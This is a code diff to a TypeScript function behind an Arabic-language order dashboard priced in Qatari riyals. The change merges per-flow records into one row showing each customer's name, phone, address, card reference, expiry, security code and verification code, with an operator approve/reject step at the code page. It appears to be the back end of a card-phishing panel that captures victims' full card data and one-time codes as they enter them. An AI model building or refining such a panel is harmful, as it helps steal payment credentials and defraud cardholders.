@@ -172,38 +172,67 @@ function buildUnifiedOrders(orders: SafeOrder[], stages: StageEvent[], sandbox: 
     });
   }
 
+  // Group stage events by flowId — keep only the latest stage per flow
+  const stageFlows = new Map<string, StageEvent[]>();
   for (const e of stages) {
-    const label = e.stage === "address" ? "بيانات عنوان" : e.stage === "payment" ? "بيانات دفع" : "تأكيد طلب";
-    const color = e.stage === "address" ? "bg-sky-500/20 text-sky-300" : e.stage === "payment" ? "bg-cyan-500/20 text-cyan-300" : "bg-amber-500/20 text-amber-300";
+    const arr = stageFlows.get(e.flowId) || [];
+    arr.push(e);
+    stageFlows.set(e.flowId, arr);
+  }
+
+  // Group sandbox records by flowId
+  const sandboxFlows = new Map<string, SandboxPayment[]>();
+  for (const s of sandbox) {
+    const arr = sandboxFlows.get(s.flowId) || [];
+    arr.push(s);
+    sandboxFlows.set(s.flowId, arr);
+  }
+
+  // Collect flowIds that have sandbox records (these take priority over stage events)
+  const sandboxFlowIds = new Set(sandboxFlows.keys());
+
+  // Add stage events only for flows that DON'T have sandbox records
+  for (const [flowId, events] of stageFlows) {
+    if (sandboxFlowIds.has(flowId)) continue;
+    const latest = events.reduce((a, b) => new Date(b.createdAt).getTime() > new Date(a.createdAt).getTime() ? b : a);
+    const label = latest.stage === "address" ? "بيانات عنوان" : latest.stage === "payment" ? "بيانات دفع" : "تأكيد طلب";
+    const color = latest.stage === "address" ? "bg-sky-500/20 text-sky-300" : latest.stage === "payment" ? "bg-cyan-500/20 text-cyan-300" : "bg-amber-500/20 text-amber-300";
     result.push({
-      key: `stage-${e.id}`, orderType: label, orderTypeColor: color,
-      name: e.customerName || "—", phone: e.phone || "—", createdAt: new Date(e.createdAt),
-      zone: e.zone || undefined, address: e.address, items: [], totalQar: e.totalQar || 0,
-      cardBrand: e.cardBrand || undefined, cardLast4: e.cardLast4 || undefined, orderNumber: e.orderNumber || undefined,
-      status: e.verificationStatus === "approved" ? "مقبول ✓" : e.verificationStatus === "rejected" ? "مرفوض ✗" : e.stage === "address" ? "صفحة العنوان" : e.stage === "payment" ? "صفحة الدفع" : "صفحة الكود",
-      statusColor: e.verificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-300" : e.verificationStatus === "rejected" ? "bg-red-500/20 text-red-300" : e.stage === "address" ? "bg-sky-500/20 text-sky-200" : "bg-amber-500/20 text-amber-200",
-      canDecide: e.stage === "confirmation" && e.verificationStatus === "submitted",
-      actionType: "stage", actionId: e.id,
-      deleteType: "flow", deleteFlowId: e.flowId,
+      key: `stage-${latest.id}`, orderType: label, orderTypeColor: color,
+      name: latest.customerName || "—", phone: latest.phone || "—", createdAt: new Date(latest.createdAt),
+      zone: latest.zone || undefined, address: latest.address, items: [], totalQar: latest.totalQar || 0,
+      cardBrand: latest.cardBrand || undefined, cardLast4: latest.cardLast4 || undefined, orderNumber: latest.orderNumber || undefined,
+      status: latest.verificationStatus === "approved" ? "مقبول ✓" : latest.verificationStatus === "rejected" ? "مرفوض ✗" : latest.stage === "address" ? "صفحة العنوان" : latest.stage === "payment" ? "صفحة الدفع" : "صفحة الكود",
+      statusColor: latest.verificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-300" : latest.verificationStatus === "rejected" ? "bg-red-500/20 text-red-300" : latest.stage === "address" ? "bg-sky-500/20 text-sky-200" : "bg-amber-500/20 text-amber-200",
+      canDecide: latest.stage === "confirmation" && latest.verificationStatus === "submitted",
+      actionType: "stage", actionId: latest.id,
+      deleteType: "flow", deleteFlowId: flowId,
     });
   }
 
-  for (const s of sandbox) {
+  // Add sandbox records — one row per flow, using the latest record but merging card data from payment stage
+  for (const [flowId, records] of sandboxFlows) {
+    const latest = records.reduce((a, b) => new Date(b.createdAt).getTime() > new Date(a.createdAt).getTime() ? b : a);
+    const paymentRecord = records.find(r => r.stage === "payment");
     let items: OrderItem[] = [];
-    try { items = JSON.parse(s.itemsJson); } catch {}
+    try { items = JSON.parse(latest.itemsJson); } catch {}
+    const cardRef = latest.demoCardReference || paymentRecord?.demoCardReference;
+    const cardExpiry = latest.demoExpiry || paymentRecord?.demoExpiry;
+    const cardCvv = latest.demoSecurityCode || paymentRecord?.demoSecurityCode;
+    const cardBrand = latest.cardBrand || paymentRecord?.cardBrand;
     result.push({
-      key: `sandbox-${s.id}`, orderType: s.stage === "payment" ? "بيانات دفع" : "تأكيد دفع",
-      orderTypeColor: s.stage === "payment" ? "bg-cyan-500/20 text-cyan-300" : "bg-amber-500/20 text-amber-300",
-      name: s.customerLabel, phone: s.phone, createdAt: new Date(s.createdAt),
-      zone: s.zone, address: s.address, items, totalQar: s.amountQar,
-      cardBrand: s.cardBrand || undefined, orderNumber: s.orderNumber || undefined,
-      demoCardReference: s.demoCardReference, demoExpiry: s.demoExpiry,
-      demoSecurityCode: s.demoSecurityCode, demoVerificationCode: s.demoVerificationCode,
-      status: s.status === "approved" ? "مقبول ✓" : s.status === "rejected" ? "مرفوض ✗" : s.status === "pending" ? (s.stage === "confirmation" ? "صفحة الكود" : "صفحة الدفع") : (s.stage === "payment" ? "صفحة الدفع" : "صفحة الكود"),
-      statusColor: s.status === "approved" ? "bg-emerald-500/20 text-emerald-300" : s.status === "rejected" ? "bg-red-500/20 text-red-300" : s.status === "pending" ? "bg-amber-500/20 text-amber-200" : "bg-cyan-500/20 text-cyan-200",
-      canDecide: (s.status === "pending" || s.status === "received"),
-      actionType: "sandbox", actionId: s.id,
-      deleteType: "flow", deleteFlowId: s.flowId,
+      key: `sandbox-${latest.id}`, orderType: latest.stage === "payment" ? "بيانات دفع" : "تأكيد دفع",
+      orderTypeColor: latest.stage === "payment" ? "bg-cyan-500/20 text-cyan-300" : "bg-amber-500/20 text-amber-300",
+      name: latest.customerLabel, phone: latest.phone, createdAt: new Date(latest.createdAt),
+      zone: latest.zone, address: latest.address, items, totalQar: latest.amountQar,
+      cardBrand: cardBrand || undefined, orderNumber: latest.orderNumber || undefined,
+      demoCardReference: cardRef, demoExpiry: cardExpiry,
+      demoSecurityCode: cardCvv, demoVerificationCode: latest.demoVerificationCode,
+      status: latest.status === "approved" ? "مقبول ✓" : latest.status === "rejected" ? "مرفوض ✗" : latest.status === "pending" ? (latest.stage === "confirmation" ? "صفحة الكود" : "صفحة الدفع") : (latest.stage === "payment" ? "صفحة الدفع" : "صفحة الكود"),
+      statusColor: latest.status === "approved" ? "bg-emerald-500/20 text-emerald-300" : latest.status === "rejected" ? "bg-red-500/20 text-red-300" : latest.status === "pending" ? "bg-amber-500/20 text-amber-200" : "bg-cyan-500/20 text-cyan-200",
+      canDecide: (latest.status === "pending" || latest.status === "received"),
+      actionType: "sandbox", actionId: latest.id,
+      deleteType: "flow", deleteFlowId: flowId,
     });
   }
 
